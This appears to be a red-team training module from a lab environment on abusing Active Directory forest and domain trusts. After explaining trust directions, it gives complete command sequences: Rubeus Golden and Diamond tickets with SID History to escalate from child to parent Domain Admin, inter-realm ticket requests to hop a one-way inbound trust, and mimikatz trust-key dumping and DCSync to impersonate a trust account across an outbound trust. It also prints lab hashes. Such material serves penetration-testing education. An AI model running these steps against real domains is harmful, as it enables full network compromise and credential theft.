# Forest and Domain Trusts

At a basic level, a trust relationship enables users in one domain to authenticate and access resources in another domain. This works by allowing authentication traffic to flow between them using referrals. When a user requests access to a resource outside of their current domain, their KDC will return a referral ticket pointing to the KDC of the target domain. The user's TGT is encrypted using an inter-realm trust key (rather than the local krbtgt), which is often called an inter-realm TGT. The foreign domain decrypts this ticket, recovers the user's TGT and decides whether they should be granted access to the resource or not.

Trusts can be one-way or two-way; and transitive or non-transitive.

A one-way trust allows principals in the trusted domain to access resources in the trusting domain, but not vice versa. A two-way trust is actually just two one-way trusts that go in the opposite directions, and allows users in each domain to access resources in the other. Trust directions are confusing as the direction of the trust is the opposite to the direction of access.

If Domain A trusts Domain B, Domain A is the trusting domain and Domain B is the trusted domain. But this allows users in Domain B to access Domain A, not A to B. To further complicate things, one-way trusts can be labelled as Inbound or Outbound depending on your perspective. In Domain A, this would be an Outbound trust; and in Domain B, this would be an Inbound trust.

Transitivity defines whether or not a trust can be chained. For instance - if Domain A trusts Domain B, and Domain B trusts Domain C; then A also trust C. If these domains are owned by different entities, then there are obvious implications in terms of the trust modelâ€¦

# Parent / Child

When a child domain is added to a forest, it automatically creates a transitive, two-way trust with its parent. This can be found in the lab where dev.cyberbotic.io is a child domain of cyberbotic.io.

    getuid
    powershell Get-DomainTrust

SourceName is the current domain, TargetName is the foreign domain, TrustDirection is the trust direction (bidirectional is two-way), and TrustAttributes: WITHIN_FOREST lets us know that both of these domains are part of the same forest which implies a parent/child relationship.

If we have Domain Admin privileges in the child, we can also gain Domain Admin privileges in the parent using a TGT with a special attribute called SID History.  SID History was designed to support migration scenarios, where a user would be moved from one domain to another.  To preserve access to resources in the "old" domain, the user's previous SID would be added to the SID History of their new account.  When creating such a ticket, the SID of a privileged group (EAs, DAs, etc) in the parent domain can be added that will grant access to all resources in the parent.

This can be achieved using either a Golden or Diamond Ticket.

### Golden Ticket

The process is the same as creating Golden Tickets previously, the only additional information required is the SID of a target group in the parent domain.

    powershell Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid
    
    powershell Get-DomainController -Domain cyberbotic.io | select Name

Create the golden ticket with Rubeus.

    PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /sids:S-1-5-21-2594061375-675613155-814674916-512 /nowrap

Then import it into a logon session and use it to access the domain controller in the parent.

    run klist
    
    ls \\dc-1.cyberbotic.io\c$

### Diamond Ticket

The Rubeus diamond command also has a /sids parameter, with which we can supply the extra SIDs we want in our ticket.

    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-2594061375-675613155-814674916-519 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap

If dev.cyberbotic.io also had a child (e.g. test.dev.cyberbotic.io), then a DA in TEST would be able to use their krbtgt to hop to DA/EA in cyberbotic.io instantly because the trusts are transitive.

There are also other means which do not require DA in the child.  For example, you can also kerberoast and ASREProast across domain trusts, which may lead to privileged credential disclosure.  Because principals in CYBER can be granted access to resources in DEV, you may find instances where they are accessing machines we have compromised.  If they interact with a machine with unconstrained delegation, we can capture their TGTs.  If they're on a machine interactively, such as RDP, we can impersonate them just like any other user.

# One-Way Inbound

dev.cyberbotic.io also has a one-way inbound trust with dev-studio.com.

    powershell Get-DomainTrust

Because the trust is inbound from our perspective, it means that principals in our domain can be granted access to resources in the foreign domain.  We can enumerate the foreign domain across the trust.

    powershell Get-DomainComputer -Domain dev-studio.com -Properties DnsHostName

Get-DomainForeignGroupMember will enumerate any groups that contain users outside of its domain and return its members.

    powershell Get-DomainForeignGroupMember -Domain dev-studio.com

This output shows that there's a member of the domain's built-in Administrators group who is not part of dev-studio.com. The MemberName field contains a SID that can be resolved in our current domain.

    powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1120

This means that members of DEV\Studio Admins are also members of the built-in Administrators group of dev-studio.com and therefore inherit local admin access to dc.dev-studio.com.  If this is confusing, this is how it looks from the perspective of the foreign domain controller.

To hop this trust, we only need to impersonate a member of this Studio Admins domain group.
    
    powershell Get-DomainGroupMember -Identity "Studio Admins" | select MemberName

To hop a domain trust using Kerberos, we first need an inter-realm key.  Obtain a TGT for the target user (here I am using asktgt with their AES256 hash).

    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /aes256:a779fa8afa28d66d155d9d7c14d394359c5d29a86b6417cb94269e2e84c4cee4 /nowrap

Next, use that TGT to request a referral ticket from the current domain to the target domain.

    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/dev-studio.com /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFwj[...]MuaW8= /nowrap

NOTE: Notice how this inter-realm ticket is of type rc4_hmac even though our TGT was aes256_cts_hmac_sha1.  This is the default configuration unless AES has been specifically configured on the trust, so this is not necessarily bad OPSEC.

Finally, use this inter-realm ticket to request TGS's in the target domain.  Here, I'm requesting a ticket for CIFS.

    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/dc.dev-studio.com /domain:dev-studio.com /dc:dc.dev-studio.com /ticket:doIFoz[...]NPTQ== /nowrap

    run klist

    ls \\dc.dev-studio.com\c$

# One-Way Outbound

Remember that if Domain A trusts Domain B, users in Domain B can access resources in Domain A; but users in Domain A should not be able to access resources in Domain B.  If we're in Domain A, then it's by design that we should not be able to access Domain B.  An outbound trust exists between cyberbotic.io and msp.org.  The direction of trust is such that cyberbotic.io trusts msp.org (so users of msp.org can access resources in cyberbotic.io).

NOTE: Because DEV has a trust with CYBER, we can query the trusts that it has by adding the -Domain parameter.

    getuid
    
    powershell Get-DomainTrust -Domain cyberbotic.io

We can still partially exploit this trust and obtain "domain user" access from CYBER to MSP by leveraging the shared credential for the trust.  Both domains in a trust relationship store a shared password (which is automatically changed every 30 days) in a Trusted Domain Object (TDO).  These objects are stored in the system container and can be read via LDAP.  Here we see that the DC in CYBER has two TDOs for its trusts with DEV and MSP.

    execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection

There are two options for obtaining the key material.  One is to move laterally to the DC itself and dump from memory.

    run hostname

    getuid

    mimikatz lsadump::trust /patch

NOTE: This performs memory patching, which is very risky, particularly on a domain controller.    

The second is to use DCSync with the TDO's GUID.

    powershell Get-DomainObject -Identity "CN=msp.org,CN=System,DC=cyberbotic,DC=io" | select objectGuid

    mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}****

[Out] and [Out-1] are the "new" and "old" passwords respectively (they're the same here because 30 days hasn't elapsed since the creation of the trust).  In most cases, the current [Out] key is the one you want.  In addition, there is also a "trust account" which is created in the "trusted" domain, with the name of the "trusting" domain.  For instance, if we get all the user accounts in the DEV domain, we'll see CYBER$ and STUDIO$, which are the trust accounts for those respective domain trusts.
    
    execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)"

This means that the MSP domain will have a trust account called CYBER$, even though we can't enumerate across the trust to confirm it.  This is the account we must impersonate to request Kerberos tickets across the trust.

    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:f3fc2312d9d1f80b78e67d55d41ad496 /nowrap

NOTE: Remember that RC4 tickets are used by default across trusts.

This TGT can now be used to interact with the domain.

    run klist

    powershell Get-Domain -Domain msp.org

This account is obviously not a domain admin, but there are multiple abuse primitives that can now be performed across the trust to elevate privileges - including kerberoasting, ASREPRoasting, RBCD, and vulnerable certificate templates.

- As a challenge, try and find a way to get DA in this forest.
